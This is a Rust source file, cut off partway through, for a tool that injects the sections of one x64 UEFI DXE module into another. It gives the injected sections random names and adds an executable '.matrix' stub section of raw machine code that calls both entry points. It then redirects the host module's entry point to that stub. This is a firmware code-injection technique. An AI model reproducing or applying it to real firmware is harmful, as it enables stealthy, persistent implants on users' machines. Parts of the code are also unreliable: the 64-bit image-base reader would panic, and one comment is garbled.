use std::io::Write;
use std::path::Path;
use std::{io, fmt};
use rand::Rng;

/// MZ Magic
const DOS_MAGIC: u16 = 0x5A4D;
/// PE\x00\x00
const PE_MAGIC : u32 = 0x00004550;

const IMAGE_NT_HEADER_SIZE: usize = 20;
const DOS_HEADER_SIZE     : usize = 64;


// The section can be executed as code.
const IMAGE_SCN_MEM_EXECUTE: u32 = 0x20000000;
// The section can be read.
const IMAGE_SCN_MEM_READ:    u32 = 0x40000000;
// The section can be written.
const IMAGE_SCN_MEM_WRITE:   u32 = 0x80000000;

//////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////

/// UEFI DXE modules receive two arguments
/// ECX = ImageHandle
/// EDX = EfiSystemTable
/// - The `prologue stub` save these in the stack
/// - The `target stub` is replicated for every target module
/// that is going to be invoked. It retrieves the two arguments
/// mentioned above and passes them to the corresponding entry point
/// - The `epilogue stub` cleans up the stack and returns
const X64_UEFI_PROLOGUE_STUB_ADDR_OFFSET: usize = 12;
const X64_UEFI_PROLOGUE_STUB: [u8; 40] = [
    0xe8, 0x00, 0x00, 0x00, 0x00,   // call +5 <delta>
    // <delta>
    0x5b,                           // pop rbx
    0x48, 0x8d, 0x5b, 0xfb,         // lea rbx, [rbx-0x5]  
    // movabs rax,0x4141414141414141
    0x48, 0xb8, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
    0x48, 0x29, 0xc3,               // sub rbx, rax
    
    0x55,                           // push   rbp
    0x48, 0x89, 0xE5,               // mov    rbp,rsp
    0x48, 0x83, 0xEC, 0x10,         // sub    rsp,0x10
    0x48, 0x89, 0x14, 0x24,         // mov    QWORD PTR [rsp],rdx
    0x48, 0x89, 0x4C, 0x24, 0x08    // mov    QWORD PTR [rsp+0x8],rcx
];

const X64_UEFI_TARGET_STUB_ADDR_OFFSET: usize = 11;
const X64_UEFI_TARGET_STUB: [u8; 25] = [
    0x48, 0x8B, 0x14, 0x24,                                      // mov    rdx,QWORD PTR [rsp]
    0x48, 0x8B, 0x4C, 0x24, 0x08,                                // mov    rcx,QWORD PTR [rsp+0x8]
    0x48, 0xB8, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,  // movabs rax,0x4141414141414141
    0x48, 0x8d, 0x04, 0x03,                                      // lea    rax, [rbx + rax]
    0xFF, 0xD0                                                   // call   rax
];
        
const X64_UEFI_EPILOGUE_STUB: [u8; 6] = [
    0x48, 0x83, 0xC4, 0x10,     // add rsp, 0x10
    0x5D,                       // pop rbp
    0xC3                        // ret
];

//////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////
/// 
/// 
/// 
fn generate_name(len: usize) -> String {
    const CHARSET: &[u8] = b"abcdefghijklmnopqrstuvwxyz0123456789";
    let mut rng = rand::thread_rng();
    let one_char = || CHARSET[rng.gen_range(0..CHARSET.len())] as char;
    std::iter::repeat_with(one_char).take(len).collect()
}

#[derive(Debug, Copy, Clone, Eq, PartialEq)]
enum MachineType {
    AMD64,
    I386,
}

impl From<u16> for MachineType {
    fn from(val: u16) -> Self {  
        match val {
            0x8664 => MachineType::AMD64,
            0x14c  => MachineType::I386,
            _ => unimplemented!("unsupported machine type")
        }
    }
}


#[derive(Debug)]
struct ImageSectionView<'a> {
    name: &'a [u8; 8],
    virtual_size: &'a u32,
    virtual_addr: &'a u32,
    sz_of_raw_data: &'a u32,
    ptr_to_raw_data: &'a u32,
    ptr_to_relocations: &'a u32,
    ptr_to_line_numbers: &'a u32,
    num_of_relocations: &'a u16,
    num_of_line_numbers: &'a u16,
    characteristics: &'a u32,
}

#[derive(Debug)]
struct ImageSectionViewMut<'a> {
    name: &'a mut [u8; 8],
    virtual_size: &'a mut u32,
    virtual_addr: &'a mut u32,
    sz_of_raw_data: &'a mut u32,
    ptr_to_raw_data: &'a mut u32,
    ptr_to_relocations: &'a mut u32,
    ptr_to_line_numbers: &'a mut u32,
    num_of_relocations: &'a mut u16,
    num_of_line_numbers: &'a mut u16,
    characteristics: &'a mut u32,
}

impl fmt::Display for ImageSectionViewMut<'_> {

    fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {
        write!(f, 
r#"
    Section `{}`:         
        virtual_addr:        {:08x}
        virtual_size:        {:08x} 
        sz_of_raw_data:      {:08x} 
        ptr_to_raw_data:     {:08x}
        ptr_to_relocations:  {:08x}
        ptr_to_line_numbers: {:08x}
        num_of_relocations:  {:04x}
        num_of_line_numbers: {:04x}
        characteristics:     {:08x}
"#,
    std::str::from_utf8(self.name).unwrap_or(""),
    self.virtual_addr,
    self.virtual_size,
    self.sz_of_raw_data,
    self.ptr_to_raw_data,
    self.ptr_to_relocations,
    self.ptr_to_line_numbers,
    self.num_of_relocations,
    self.num_of_line_numbers,
    self.characteristics
        )
    }
} 

impl fmt::Display for ImageSectionView<'_> {

    fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {
        write!(f, 
r#"
    Section `{}`:         
        virtual_addr:        {:08x}
        virtual_size:        {:08x} 
        sz_of_raw_data:      {:08x} 
        ptr_to_raw_data:     {:08x}
        ptr_to_relocations:  {:08x}
        ptr_to_line_numbers: {:08x}
        num_of_relocations:  {:04x}
        num_of_line_numbers: {:04x}
        characteristics:     {:08x}
"#,
    std::str::from_utf8(self.name).unwrap_or(""),
    self.virtual_addr,
    self.virtual_size,
    self.sz_of_raw_data,
    self.ptr_to_raw_data,
    self.ptr_to_relocations,
    self.ptr_to_line_numbers,
    self.num_of_relocations,
    self.num_of_line_numbers,
    self.characteristics
        )
    }
} 

/// An IMAGE_SECTION_HEADER 
#[derive(Debug, Copy, Clone)]
#[repr(C)]
struct ImageSection {
    name: [u8; 8],
    virtual_size: u32,
    virtual_addr: u32,
    sz_of_raw_data: u32,
    ptr_to_raw_data: u32,
    ptr_to_relocations: u32,
    ptr_to_line_numbers: u32,
    num_of_relocations: u16,
    num_of_line_numbers: u16,
    characteristics: u32,
}

impl From<&ImageSectionViewMut<'_>> for ImageSection {
    fn from(section_view: &ImageSectionViewMut) -> Self {  
        Self {
            name: section_view.name.clone(),
            virtual_addr: *section_view.virtual_addr,
            virtual_size: *section_view.virtual_size,
            sz_of_raw_data: *section_view.sz_of_raw_data,
            ptr_to_raw_data: *section_view.ptr_to_raw_data,
            ptr_to_relocations: *section_view.ptr_to_relocations,
            ptr_to_line_numbers: *section_view.ptr_to_line_numbers,
            num_of_relocations: *section_view.num_of_relocations,
            num_of_line_numbers: *section_view.num_of_line_numbers,
            characteristics:    *section_view.characteristics
        }
    }
}

impl From<&ImageSectionView<'_>> for ImageSection {
    fn from(section_view: &ImageSectionView) -> Self {  
        Self {
            name: section_view.name.clone(),
            virtual_addr: *section_view.virtual_addr,
            virtual_size: *section_view.virtual_size,
            sz_of_raw_data: *section_view.sz_of_raw_data,
            ptr_to_raw_data: *section_view.ptr_to_raw_data,
            ptr_to_relocations: *section_view.ptr_to_relocations,
            ptr_to_line_numbers: *section_view.ptr_to_line_numbers,
            num_of_relocations: *section_view.num_of_relocations,
            num_of_line_numbers: *section_view.num_of_line_numbers,
            characteristics:    *section_view.characteristics
        }
    }
}



impl fmt::Display for ImageSection {

    fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {
        write!(f, 
r#"
    Section `{}`:         
        virtual_addr:        {:08x}
        virtual_size:        {:08x} 
        sz_of_raw_data:      {:08x} 
        ptr_to_raw_data:     {:08x}
        ptr_to_relocations:  {:08x}
        ptr_to_line_numbers: {:08x}
        num_of_relocations:  {:04x}
        num_of_line_numbers: {:04x}
        characteristics:     {:08x}
"#,
    std::str::from_utf8(&self.name).unwrap_or(""),
    self.virtual_addr,
    self.virtual_size,
    self.sz_of_raw_data,
    self.ptr_to_raw_data,
    self.ptr_to_relocations,
    self.ptr_to_line_numbers,
    self.num_of_relocations,
    self.num_of_line_numbers,
    self.characteristics
        )
    }
} 

/// This structure provides a mutable view into the
/// bytes that conform the PE
struct PEView {
    nt_header_offset:   usize,
    optional_header_offset: usize,

    /// Offset into the start of the Section Headers
    section_hdr_offset:        usize,
    
    /// The actual bytes of the PE
    raw_data:           Vec<u8>
}

impl PEView {

    /// Retrieves the type of m_machine from the NT Header
    pub fn get_machine(&self) -> MachineType {
        let k = self.nt_header_offset;
        MachineType::from(u16::from_le_bytes(self.raw_data[k..k+2].try_into().unwrap()))
    }

    /// Retrieves the NT Header m_number_of_sections
    pub fn get_number_of_sections(&self) -> usize {
        let k = self.nt_header_offset;
        u16::from_le_bytes(self.raw_data[k+2..k+4].try_into().unwrap()) as usize
    }

    /// Updates the NT Header m_number_of_sections field
    pub fn set_number_of_sections(&mut self, val: usize) {
        let k = self.nt_header_offset;
        let u16_mut_ref: &mut u16 = unsafe { 
            &mut *(self.raw_data[k+2..k+4].as_mut_ptr() as *mut u16) 
        };
        *u16_mut_ref = val as u16;
    }

    

    /// Gets the SizeOfCode from the OPTIONAL_HEADER
    fn get_size_of_code(&self) -> usize {
        let k = self.optional_header_offset;
        u32::from_le_bytes(self.raw_data[k+4..k+8].try_into().unwrap()) as usize
    }

    /// Sets the SizeOfCode in the OPTIONAL_HEADER
    pub fn set_size_of_code(&mut self, val: usize) {
        let k = self.optional_header_offset;
        let u32ref = unsafe { 
            &mut *(self.raw_data[k+4..k+8].as_mut_ptr() as *mut u32) 
        };
        *u32ref = val as u32;
    }

    /// Gets the SizeOfInitializedData from the OPTIONAL_HEADER
    pub fn get_size_of_initialized_data(&self) -> usize {
        let k = self.optional_header_offset;
        u32::from_le_bytes(self.raw_data[k+8..k+12].try_into().unwrap()) as usize
    }

    /// Sets the SizeOfInitializedData in the OPTIONAL_HEADER
    pub fn set_size_of_initialized_data(&mut self, val: usize) {
        let k = self.optional_header_offset;
        let u32ref = unsafe { 
            &mut *(self.raw_data[k+8..k+12].as_mut_ptr() as *mut u32) 
        };
        *u32ref = val as u32;
    }

    /// Gets the SizeOfUninitializedData from the OPTIONAL_HEADER
    pub fn get_size_of_uninitialized_data(&self) -> usize {
        let k = self.optional_header_offset;
        u32::from_le_bytes(self.raw_data[k+12..k+16].try_into().unwrap()) as usize
    }

    /// Sets the SizeOfUninitializedData in the OPTIONAL_HEADER
    pub fn set_size_of_uninitialized_data(&mut self, val: u32) {
        let k = self.optional_header_offset;
        let u32ref = unsafe { 
            &mut *(self.raw_data[k+12..k+16].as_mut_ptr() as *mut u32) 
        };
        *u32ref = val;
    }

    /// Gets the AddressOfEntryPoint from the OPTIONAL_HEADER
    pub fn get_entry_point(&self) -> usize {
        let k = self.optional_header_offset;
        u32::from_le_bytes(self.raw_data[k+16..k+20].try_into().unwrap()) as usize
    }

    /// Sets the AddressOfEntryPoint in the OPTIONAL_HEADER
    pub fn set_entry_point(&mut self, val: usize) {
        let k = self.optional_header_offset;
        let u32ref = unsafe { 
            &mut *(self.raw_data[k+16..k+20].as_mut_ptr() as *mut u32) 
        };
        *u32ref = val as u32;
    }

    /// Gets the BaseOfCode from the OPTIONAL_HEADER
    pub fn get_base_of_code(&self) -> usize {
        let k = self.optional_header_offset;
        u32::from_le_bytes(self.raw_data[k+20..k+24].try_into().unwrap()) as usize
    }

    /// Sets the BaseOfCode in the OPTIONAL_HEADER
    pub fn set_base_of_code(&mut self, val: u32) {
        let k = self.optional_header_offset;
        let u32ref = unsafe { 
            &mut *(self.raw_data[k+20..k+24].as_mut_ptr() as *mut u32) 
        };
        *u32ref = val;
    }

    /// Gets the BaseOfData from the OPTIONAL_HEADER
    fn get_base_of_data(&self) -> usize {
        if self.get_machine() != MachineType::I386 {
            panic!("error: getting base of data for AMD64");
        }

        let k = self.optional_header_offset;
        u32::from_le_bytes(self.raw_data[k+24..k+28].try_into().unwrap()) as usize
    }

    /// Sets the BaseOfData in the OPTIONAL_HEADER
    fn set_base_of_data(&mut self, val: u32) {
        if self.get_machine() != MachineType::I386 {
            panic!("error: setting base of data for AMD64");
        }

        let k = self.optional_header_offset;
        let u32ref = unsafe { 
            &mut *(self.raw_data[k+24..k+28].as_mut_ptr() as *mut u32) 
        };
        *u32ref = val;
    }

    /// Gets the ImageBase from the OPTIONAL_HEADER
    fn get_image_base(&self) -> usize {        
        let k = self.optional_header_offset;
        match self.get_machine() {
            MachineType::I386 => {
                u32::from_le_bytes(self.raw_data[k+28..k+32].try_into().unwrap()) as usize
            }
            MachineType::AMD64 => {
                u32::from_le_bytes(self.raw_data[k+24..k+32].try_into().unwrap()) as usize
            }
        }
        
    }

    /// Sets the ImageBase from the OPTIONAL_HEADER
    fn set_image_base(&mut self, val: u64) {        
        let k = self.optional_header_offset;
        match self.get_machine() {
            MachineType::I386 => {
                let u32ref = unsafe { 
                    &mut *(self.raw_data[k+28..k+32].as_mut_ptr() as *mut u32) 
                };
                *u32ref = val as u32;
            }
            MachineType::AMD64 => {
                let u64ref = unsafe { 
                    &mut *(self.raw_data[k+24..k+32].as_mut_ptr() as *mut u64) 
                };
                *u64ref = val;
            }
        }
        
    }

    /// Gets the SectionAlignment from the OPTIONAL_HEADER
    fn get_section_alignment(&self) -> usize {
        let k = self.optional_header_offset;
        u32::from_le_bytes(self.raw_data[k+32..k+36].try_into().unwrap()) as usize
    }

    /// Gets the FileAlignment from the OPTIONAL_HEADER
    fn get_file_alignment(&self) -> usize {
        let k = self.optional_header_offset;
        u32::from_le_bytes(self.raw_data[k+36..k+40].try_into().unwrap()) as usize
    }

    /// Gets the SizeOfImage from the OPTIONAL_HEADER
    fn get_size_of_image(&self) -> usize {
        let k = self.optional_header_offset;
        u32::from_le_bytes(self.raw_data[k+56..k+60].try_into().unwrap()) as usize
    }

    /// Sets the SizeOfImage in the OPTIONAL_HEADER
    fn set_size_of_image(&mut self, val: usize) {
        let k = self.optional_header_offset;
        let u32ref = unsafe { 
            &mut *(self.raw_data[k+56..k+60].as_mut_ptr() as *mut u32) 
        };
        *u32ref = val as u32;
    }

    /// Gets the SizeOfHeaders from the OPTIONAL_HEADER
    fn get_size_of_headers(&self) -> usize {
        let k = self.optional_header_offset;
        u32::from_le_bytes(self.raw_data[k+60..k+64].try_into().unwrap()) as usize
    }

    /// Sets the SizeOfHeaders in the OPTIONAL_HEADER
    fn set_size_of_headers(&mut self, val: usize) {
        let k = self.optional_header_offset;
        let u32ref = unsafe { 
            &mut *(self.raw_data[k+60..k+64].as_mut_ptr() as *mut u32) 
        };
        *u32ref = val as u32;
    }


    /// Sets the Checksum in the OPTIONAL_HEADER
    fn set_checksum(&mut self, val: usize) {
        let k = self.optional_header_offset;
        let u32ref = unsafe { 
            &mut *(self.raw_data[k+64..k+68].as_mut_ptr() as *mut u32) 
        };
        *u32ref = val as u32;
    }

   
    
    /// Gets a vector of `Views` into the section header
    pub fn create_array_view_of_sections_mut(
        section_hdr_offset: usize, num_of_sections: usize, 
        pe_bytes: &mut Vec<u8>) -> Vec::<ImageSectionViewMut> 
    {
        
        let mut sections_view = Vec::<ImageSectionViewMut>::new();
        let mut k = section_hdr_offset;

        for _ in 0..num_of_sections { 

            let section_view = ImageSectionViewMut {
                name:                 unsafe { &mut *(pe_bytes[k..k+8].as_mut_ptr() as *mut [u8; 8]) },
                virtual_size:         unsafe { &mut *(pe_bytes[k+8..k+12].as_mut_ptr() as *mut u32) },
                virtual_addr:         unsafe { &mut *(pe_bytes[k+12..k+16].as_mut_ptr() as *mut u32) },
                sz_of_raw_data:       unsafe { &mut *(pe_bytes[k+16..k+20].as_mut_ptr() as *mut u32) },
                ptr_to_raw_data:      unsafe { &mut *(pe_bytes[k+20..k+24].as_mut_ptr() as *mut u32) },
                ptr_to_relocations:   unsafe { &mut *(pe_bytes[k+24..k+28].as_mut_ptr() as *mut u32) },
                ptr_to_line_numbers:  unsafe { &mut *(pe_bytes[k+28..k+32].as_mut_ptr() as *mut u32) },
                num_of_relocations:   unsafe { &mut *(pe_bytes[k+32..k+34].as_mut_ptr() as *mut u16) },
                num_of_line_numbers:  unsafe { &mut *(pe_bytes[k+34..k+36].as_mut_ptr() as *mut u16) },
                characteristics:      unsafe { &mut *(pe_bytes[k+36..k+40].as_mut_ptr() as *mut u32) },              
            };
            
            k = k + core::mem::size_of::<ImageSection>();
            
            sections_view.push(section_view);
        }

        sections_view
    }

    pub fn create_array_view_of_sections(
        section_hdr_offset: usize, num_of_sections: usize, 
        pe_bytes: &Vec<u8>) -> Vec::<ImageSectionView> 
    {
        
        let mut sections_view = Vec::<ImageSectionView>::new();
        let mut k = section_hdr_offset;

        for _ in 0..num_of_sections { 

            let section_view = ImageSectionView {
                name:                 unsafe { & *(pe_bytes[k..k+8].as_ptr() as *const [u8; 8]) },
                virtual_size:         unsafe { & *(pe_bytes[k+8..k+12].as_ptr() as *const u32) },
                virtual_addr:         unsafe { & *(pe_bytes[k+12..k+16].as_ptr() as *const u32) },
                sz_of_raw_data:       unsafe { & *(pe_bytes[k+16..k+20].as_ptr() as *const u32) },
                ptr_to_raw_data:      unsafe { & *(pe_bytes[k+20..k+24].as_ptr() as *const u32) },
                ptr_to_relocations:   unsafe { & *(pe_bytes[k+24..k+28].as_ptr() as *const u32) },
                ptr_to_line_numbers:  unsafe { & *(pe_bytes[k+28..k+32].as_ptr() as *const u32) },
                num_of_relocations:   unsafe { & *(pe_bytes[k+32..k+34].as_ptr() as *const u16) },
                num_of_line_numbers:  unsafe { & *(pe_bytes[k+34..k+36].as_ptr() as *const u16) },
                characteristics:      unsafe { & *(pe_bytes[k+36..k+40].as_ptr() as *const u32) },              
            };
            
            k = k + core::mem::size_of::<ImageSection>();
            
            sections_view.push(section_view);
        }

        sections_view
    }


    /// Performs basic validation over the PE structure
    /// and returns a PEView instance over it
    fn load_pe(pe_bytes: Vec<u8>) -> Option<Self> {
        // Check minimum DOS header length (64 bytes)
        if pe_bytes.len() < DOS_HEADER_SIZE {
            println!("invalid DOS header length");            
            return None;
        }
    
        // Check MZ magic
        let dos_magic = u16::from_le_bytes(pe_bytes[0..2].try_into().unwrap());
        if dos_magic != DOS_MAGIC {            
            println!("invalid MZ magic");
            return None;
        }
    
        // Get offset to PE Header
        let e_lfanew = u32::from_le_bytes(pe_bytes[0x3C..0x40].try_into().unwrap()) as usize;
        if pe_bytes.len() < e_lfanew + 4 + IMAGE_NT_HEADER_SIZE {            
            println!("invalid PE length (PE/NT header)");
            return None;
        }
    
        // Position to the base of the PE Header
        let mut k = e_lfanew;
    
        // Check PE Magic
        let pe_magic = u32::from_le_bytes(pe_bytes[k..k+4].try_into().unwrap());
        if pe_magic != PE_MAGIC {            
            println!("invalid PE magic");
            return None;
        }
    
        // Position to the base of IMAGE_NT_HEADER
        k = k + 4;   
        let nt_header_offset = k;

        let m_size_of_optional_header = 
            u16::from_le_bytes(pe_bytes[k+16..k+18].try_into().unwrap());
    
        // Position to the base of IMAGE_OPTIONAL_HEADER
        k = k + IMAGE_NT_HEADER_SIZE;
        let optional_header_offset = k;

        // Check the size of optional header is within bounds of the file
        if pe_bytes.len() < (k + m_size_of_optional_header as usize) {            
            println!("invalid PE length (optional header)");
            return None;
        }   
        
        // Position to Section Headers
        k = k + m_size_of_optional_header as usize;
        let section_hdr_offset = k;
    
        

        let pe_info = PEView {
            nt_header_offset:       nt_header_offset,
            optional_header_offset: optional_header_offset,
            section_hdr_offset:     section_hdr_offset,
            raw_data:               pe_bytes
        };
        
        
        Some(pe_info)
    }
    
    
    /// Loads a PE from disk
    fn load_pe_from_disk<P: AsRef<Path>>(filename: P) -> Result<PEView, io::Error> {
    
        let file_bytes = std::fs::read(filename)?;
    
        if let Some(pe_view) = PEView::load_pe(file_bytes) {
            return Ok(pe_view);
        } else {
            return Err(io::Error::other("error validating PE file"));
        }            
    }


    /// stub_va: the virtual address base of the STUB
    /// ep1: the VA of the entry point 1
    /// ep2: the VA of the entry point 2
    fn create_stub_with_entry_points(stub_va: usize, ep1: usize, ep2: usize) -> Vec<u8> {
        let mut stub = Vec::<u8>::new();

        let mut prologue = X64_UEFI_PROLOGUE_STUB.clone().to_vec();
        let stub_va = unsafe {
            core::slice::from_raw_parts(&stub_va as *const usize as *const u64 as *const u8, 8)
        };
        prologue.splice(
            X64_UEFI_PROLOGUE_STUB_ADDR_OFFSET..X64_UEFI_PROLOGUE_STUB_ADDR_OFFSET+8,
            stub_va.iter().cloned()
        );


        let mut target1 = X64_UEFI_TARGET_STUB.clone().to_vec();
        let ep1 = unsafe {
            core::slice::from_raw_parts(&ep1 as *const usize as *const u64 as *const u8, 8)
        };
        target1.splice(
            X64_UEFI_TARGET_STUB_ADDR_OFFSET..X64_UEFI_TARGET_STUB_ADDR_OFFSET+8,
            ep1.iter().cloned()
        );


        let mut target2 = X64_UEFI_TARGET_STUB.clone().to_vec();
        let ep2 = unsafe {
            core::slice::from_raw_parts(&ep2 as *const usize as *const u64 as *const u8, 8)
        };
        target2.splice(
            X64_UEFI_TARGET_STUB_ADDR_OFFSET..X64_UEFI_TARGET_STUB_ADDR_OFFSET+8,
            ep2.iter().cloned()
        );
        

        stub.extend_from_slice(&prologue);
        stub.extend_from_slice(&target1);
        stub.extend_from_slice(&target2);
        stub.extend_from_slice(&X64_UEFI_EPILOGUE_STUB);

        stub        
    }


    /// This function takes a PEView as an argument and attempts to merge
    /// the sections of it into the current PEView instance
    fn merge_pe(&mut self, src_pe: &PEView) -> Option<()> {
        
        // For now, only x64 is supported
        if self.get_machine() != MachineType::AMD64 {
            panic!("Only AMD64 images are supported (target pe)");
        }

        if src_pe.get_machine() != MachineType::AMD64 {
            panic!("Only AMD64 images are supported (source pe)");
        }

        // Calculate the available space for additional Section Header entries            
        // If no enough space is available, things need to be moved. Unsupported for now
        let original_section_hdrs_space = self.get_number_of_sections()
                                        * core::mem::size_of::<ImageSection>();

                                        
        let file_alignment = self.get_file_alignment();
        let section_alignment = self.get_section_alignment();

        // This retrives a window into the SectionHeader
        let mut sections_view = 
            PEView::create_array_view_of_sections_mut(
                self.section_hdr_offset, 
                self.get_number_of_sections(), 
                &mut self.raw_data
            );

        // Get the section with the lower raw address with a size greater than 0
        let first_raw_section = sections_view.iter()
                            .filter(|x| *x.sz_of_raw_data > 0)
                            .min_by_key(|x| *x.ptr_to_raw_data).unwrap();

    
        // Calculate how much additional space for sections is required
        // Take into account the section for the STUB
        let required_space_for_sections = (src_pe.get_number_of_sections() + 1) 
                                                * core::mem::size_of::<ImageSection>();        
        
        // Calculate available space
        let available_space = *first_raw_section.ptr_to_raw_data as usize - 
                                    (original_section_hdrs_space + self.section_hdr_offset);
                                

        if required_space_for_sections > available_space {
            // Align this number to File-Align in the target-pe                            
            let required_aligned_space = 
                (required_space_for_sections + (file_alignment - 1)) & !(file_alignment - 1);

            // Update existing PointersToRawData and splice the underlying vector
            for section in &mut sections_view {
                *section.ptr_to_raw_data += required_aligned_space as u32;
            }

            // Insert Zeros at offset
            let offset = self.section_hdr_offset + original_section_hdrs_space;  
            let nulls = std::iter::repeat(0u8)
                                .take(required_aligned_space).collect::<Vec<u8>>();
          
            self.raw_data.splice(offset..offset, nulls);    
        }

        // The splice operation could have re-allocated the raw_data
        // We need to re-create the Section Window        
        let sections_view = 
            PEView::create_array_view_of_sections(
                self.section_hdr_offset, 
                self.get_number_of_sections(), 
                &self.raw_data
            );   
        
        // Get the section with highest virtual address from our target PE
        let last_section = sections_view.iter().max_by_key(|x| *x.virtual_addr).unwrap();        
        // We expect the section with the highest VA is also the last one in terms 
        // of RAW offset within the file. Validate this assumptionstub_len
        {
            let s2 = sections_view.iter().max_by_key(|x| *x.ptr_to_raw_data).unwrap();
            if *s2.ptr_to_raw_data != *last_section.ptr_to_raw_data {
                panic!("The section with the highgest VA of target PE is not the last one (raw) in the file")
            }
        }

        // Get the VA and RAW pointers and align them
        let ptr_va = (*last_section.virtual_addr + *last_section.virtual_size) as usize;        
        let mut aligned_va = (ptr_va + (section_alignment - 1)) & !(section_alignment - 1);
        
        // This only works if the DATA DIRECTORIES related offsets are before the sections
        // THis is NOT the case for some binaries so we rather grab the offset to the end of the file
            // let ptr_to_raw = (*last_section.ptr_to_raw_data + *last_section.sz_of_raw_data) as usize;
            // let file_alignment = self.optional_header.get_file_alignment() as usize;
            // let mut aligned_raw = (ptr_to_raw + (file_alignment - 1)) & !(file_alignment - 1);
        
        let ptr_to_raw = self.raw_data.len();
        let mut aligned_raw = (ptr_to_raw + (file_alignment - 1)) & !(file_alignment - 1);
        // Padd the end of the file if necessary
        if aligned_raw > ptr_to_raw {
            let nulls = std::iter::repeat(0u8)
                                .take(aligned_raw - ptr_to_raw).collect::<Vec<u8>>();

            self.raw_data.splice(ptr_to_raw..ptr_to_raw, nulls);
        }

        assert!(aligned_raw == self.raw_data.len(), "error padding the file");
        

        // Get the offset at the end of the current existing sections
        let mut section_offset = original_section_hdrs_space + self.section_hdr_offset;

        let src_sections_view = 
            PEView::create_array_view_of_sections(
                src_pe.section_hdr_offset, 
                src_pe.get_number_of_sections(), 
                &src_pe.raw_data
            );

        let mut src_pe_entry_point = src_pe.get_entry_point() as u32;

        let mut new_inserted_sections = 0usize;
        for src_section_view in &src_sections_view {
            let mut src_section = ImageSection::from(src_section_view);

            // First, copy the section content to the target PE
            let src_start = src_section.ptr_to_raw_data as usize;
            let src_end   = src_start + src_section.sz_of_raw_data as usize;

            // println!(
            //     "Copying from [{:08x}::{:08x}] to [{:08x}::{:08x}]",
            //     src_start, src_end, aligned_raw, aligned_raw + src_section.sz_of_raw_data as usize
            // );
            self.raw_data.splice(
                aligned_raw..aligned_raw,
                src_pe.raw_data.get(src_start..src_end).unwrap().iter().cloned()
            );

            // Second, update the section header attributes

            // Change name of the section
            let mut random_name = generate_name(7);
            random_name.insert_str(0, ".");
            src_section.name.copy_from_slice(random_name.as_bytes());
            
            // re-calculate entry_point for the src_pe
            if src_pe_entry_point >= src_section.virtual_addr && 
                src_pe_entry_point < (src_section.virtual_addr + src_section.virtual_size) 
            {
                src_pe_entry_point = (src_pe_entry_point - src_section.virtual_addr) + aligned_va as u32;
            }

            // Change VA for the section
            src_section.virtual_addr = aligned_va as u32;
            // Update algined_va
            aligned_va += src_section.virtual_size as usize;
            aligned_va = (aligned_va + (section_alignment - 1)) & !(section_alignment - 1);

            // Change RAW for the section
            src_section.ptr_to_raw_data = aligned_raw as u32;
            
            // transform the section entries to bytes
            let section_bytes = unsafe { 
                core::slice::from_raw_parts(
                    &src_section as *const ImageSection as *const u8, 
                    core::mem::size_of::<ImageSection>()
                )
            };

            // Third, Copy section entry bytes into the section header
            self.raw_data.splice(
                section_offset..section_offset+core::mem::size_of::<ImageSection>(),
                section_bytes.iter().cloned()
            );
      
            // Update aligned_raw
            aligned_raw += src_section.sz_of_raw_data as usize;
            aligned_raw = (aligned_raw + (file_alignment - 1)) & !(file_alignment - 1);

            // Padd with nulls until file_alignment
            let ptr_to_raw = self.raw_data.len();
            if aligned_raw > ptr_to_raw {
                let nulls = std::iter::repeat(0u8)
                                    .take(aligned_raw - ptr_to_raw).collect::<Vec<u8>>();
                self.raw_data.splice(ptr_to_raw..ptr_to_raw, nulls);
            }
      
            assert!(aligned_raw == self.raw_data.len(), "error padding the file");

            // Update the offset to point into the next section
            section_offset += core::mem::size_of::<ImageSection>();
            

            // Update number of inserted sections
            new_inserted_sections += 1;
        }

        // Update number of sections in the PE
        self.set_number_of_sections(self.get_number_of_sections() + new_inserted_sections);

        // Create STUB with entry points
        let stub = PEView::create_stub_with_entry_points(
            aligned_va,
            self.get_entry_point(),
             src_pe_entry_point as usize
        );

        let raw_aligned_stub_len = (stub.len() + (file_alignment - 1)) & !(file_alignment - 1);
        let va_aligned_stub_len = (stub.len() + (section_alignment - 1)) & !(section_alignment - 1);

        let stub_section = ImageSection {
            name: *b".matrix\0",
            virtual_size: stub.len() as u32,
            virtual_addr: aligned_va as u32,
            sz_of_raw_data: raw_aligned_stub_len as u32,
            ptr_to_raw_data: aligned_raw as u32,
            ptr_to_relocations: 0,
            ptr_to_line_numbers: 0,
            num_of_relocations: 0,
            num_of_line_numbers: 0,
            characteristics: 0x68000020, // Executable|Readable|Pageable|Code
        };
        
        // transform the section entries to bytes
        let section_bytes = unsafe { 
            core::slice::from_raw_parts(
                &stub_section as *const ImageSection as *const u8, 
                core::mem::size_of::<ImageSection>()
            )
        };

        section_offset = self.section_hdr_offset + 
            self.get_number_of_sections() * core::mem::size_of::<ImageSection>();

        // Third, Copy section entry bytes into the section header
        self.raw_data.splice(
            section_offset..section_offset+core::mem::size_of::<ImageSection>(),
            section_bytes.iter().cloned()
        );
           
        // Copy stub and padd the end of the file        
        self.raw_data.splice(
            aligned_raw..aligned_raw,
            stub
        );

        // Update aligned_raw
        aligned_raw += raw_aligned_stub_len;
        aligned_raw = (aligned_raw + (file_alignment - 1)) & !(file_alignment - 1);

        // Padd with nulls until file_alignment
        let ptr_to_raw = self.raw_data.len();
        if aligned_raw > ptr_to_raw {
            let nulls = std::iter::repeat(0u8)
                                .take(aligned_raw - ptr_to_raw).collect::<Vec<u8>>();
            self.raw_data.splice(ptr_to_raw..ptr_to_raw, nulls);
        }
        
        assert!(aligned_raw == self.raw_data.len(), "error padding the file");


        // Update the sections to include the STUB
        self.set_number_of_sections(self.get_number_of_sections() + 1);


        // Set Entry Point to the STUB
        self.set_entry_point(aligned_va);


        // Update size of code 
        self.set_size_of_code(
            self.get_size_of_code() + 
            va_aligned_stub_len +
            src_pe.get_size_of_code()
        );

        // Update size of data 
        self.set_size_of_initialized_data(
            self.get_size_of_initialized_data() + 
            src_pe.get_size_of_initialized_data()
        );

        // Set Size Of Image to the last Virtual Address + Virtual Size
        let (size_of_image, size_of_headers) = {
            let sections_view = 
            PEView::create_array_view_of_sections(
                self.section_hdr_offset, 
                self.get_number_of_sections(), 
                &self.raw_data
            );

            let v_size = *sections_view[sections_view.len() - 1].virtual_size as usize;
